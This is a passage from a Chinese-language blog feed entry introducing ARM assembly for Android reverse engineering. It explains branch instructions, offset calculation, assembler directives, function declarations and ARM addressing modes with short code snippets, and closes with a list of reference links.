class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li>B：无条件跳转</li><li>BL：带链接的无条件跳转</li><li>BLX：带状态的无条件跳转</li><li>BNE：不相等跳转</li><li>BEQ：相等跳转</li></ul><h4 id="偏移地址计算"><a href="#偏移地址计算" class="headerlink" title="偏移地址计算"></a>偏移地址计算</h4><ul><li>ARM：低 27 位是偏移位置<ul><li>偏移 = (目标地址 - 当前 PC 地址) / 指令长度</li><li>正数下跳，负数上跳</li></ul></li><li>Thumb 同理</li><li>目标地址 = 偏移 * 指令长度 + 当前偏移地址</li></ul><h2 id="ARM-代码编写"><a href="#ARM-代码编写" class="headerlink" title="ARM 代码编写"></a>ARM 代码编写</h2><p>处理器架构定义：</p><ul><li><code>.arch</code> 指定了 ARM 处理器架构。</li><li><code>armv5te</code> 表示本程序在 armv5te 架构处理器上运行。</li><li><code>.fpu</code> 指定了协处理器的类型。</li><li><code>softvfp</code> 表示使用浮点运算库来模拟协处理运算。</li><li><code>.ebi_attribute</code> 指定了一些接口属性。</li></ul><pre><code class="arm">.arch armv5te @处理器架构.fpu softvfp  @协处理器类型.ebi_attribute 20, 1 @接口属性.ebi_attribute 21, 1.ebi_attribute 23, 1.ebi_attribute 24, 1.ebi_attribute 25, 1.ebi_attribute 26, 1.ebi_attribute 30, 1.ebi_attribute 18, 1</code></pre><p>段定义：</p><ul><li><code>.section</code>：定义只读数据，属性是默认</li><li><code>.text</code>：定义了代码段。</li></ul><p>注释方法：</p><ul><li><code>/.../</code>：多行注释</li><li><code>@</code>：单行注释</li></ul><p>标号方式（和 8086 类似）：</p><pre><code class="arm">loop:    ...end loop</code></pre><p>程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集：</p><ul><li>.file：制定了源文件名。</li><li>.align：代码对其方式。</li><li>.ascii：声明字符串。</li><li>.global：声明全局变量。</li><li>.type：指定符号的类型。</li></ul><p>声明函数的方法：</p><pre><code class="arm">.global 函数名.type 函数名, %function函数名:    &lt;...函数体...&gt;声明一个实现两个数相加的函数的代码.global MyAdd.type MyAdd, &amp;functionMyAdd:    ADD R0, R0, R1    MOV PC, LR</code></pre><h2 id="ARM-处理器寻址方式"><a href="#ARM-处理器寻址方式" class="headerlink" title="ARM 处理器寻址方式"></a>ARM 处理器寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><pre><code class="arm">@ 井号（#）作为前缀，表示16进制时以“0x”开头MOV R0，#1234 @ R0=0x1234</code></pre><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><pre><code class="arm">MOV R0, R1 @ R0=R1</code></pre><h3 id="寄存器移位寻址"><a href="#寄存器移位寻址" class="headerlink" title="寄存器移位寻址"></a>寄存器移位寻址</h3><p>五种移位操作：</p><ul><li>LSL：逻辑左移，移位后寄存器空出的低位补 0；</li><li>LSR：逻辑右移，移位后寄存器空出的高位补 0；</li><li>ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1；</li><li>ROR：循环右移，移位后移出的低位填入移位空出的高位；</li><li>RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。</li></ul><pre><code class="arm">MOV R0, R1, LSL#2 @ R0=R1*4</code></pre><h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><pre><code class="arm">LDR R0，[R1] @ 将R1寄存器中的值作为地址，取出地址中的值赋予R0</code></pre><h3 id="寄存器间接基址偏移寻址"><a href="#寄存器间接基址偏移寻址" class="headerlink" title="寄存器间接基址偏移寻址"></a>寄存器间接基址偏移寻址</h3><pre><code class="arm">LDR R0, [R1, #-4] @ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0</code></pre><h3 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h3><pre><code class="arm">@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1LDMIA R0, {R1, R2, R3, R4}@ R1=[R0]@ R2=[R0+#4]@ R3=[R0+#8]@ R4=[R0+#12]@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节</code></pre><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><pre><code class="arm">STMFD SP!, {R1-R7, LR} @ 入栈，多用于保存子程序堆栈LDMFD SP!, {R1-R7, LR} @ 出栈，多用于恢复子程序堆栈</code></pre><h3 id="块拷贝寻址"><a href="#块拷贝寻址" class="headerlink" title="块拷贝寻址"></a>块拷贝寻址</h3><p>块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。</p><pre><code class="arm">LDMIA R0!, {R1-R3} @ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。</code></pre><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p>相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://blog.csdn.net/miao_007/article/details/87632758" target="_blank" rel="noopener">https://blog.csdn.net/miao_007/article/details/87632758</a><br><a href="https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code</a><br><a href="https://www.jianshu.com/p/acbf724fdcc9" target="_blank" rel="noopener">https://www.jianshu.com/p/acbf724fdcc9</a><br><a href="https://blog.csdn.net/afei__/article/details/81031965" target="_blank" rel="noopener">https://blog.csdn.net/afei__/article/details/81031965</a><br><a href="https://www.luoxudong.com/360.html" target="_blank" rel="noopener">https://www.luoxudong.com/360.html</a><br><a href="https://www.jianshu.com/p/23af9151837e" target="_blank" rel="noopener">https://www.jianshu.com/p/23af9151837e</a><br><a href="https://juejin.im/post/5afe28446fb9a07aa0483d0a" target="_blank" rel="noopener">https://juejin.im/post/5afe28446fb9a07aa0483d0a</a><br><a href="https://www.52pojie.cn/thread-699268-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-699268-1-1.html</a><br><a href="https://www.52pojie.cn/thread-673175-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-673175-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android JNI 编程及 ARM 汇编入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
</feed>
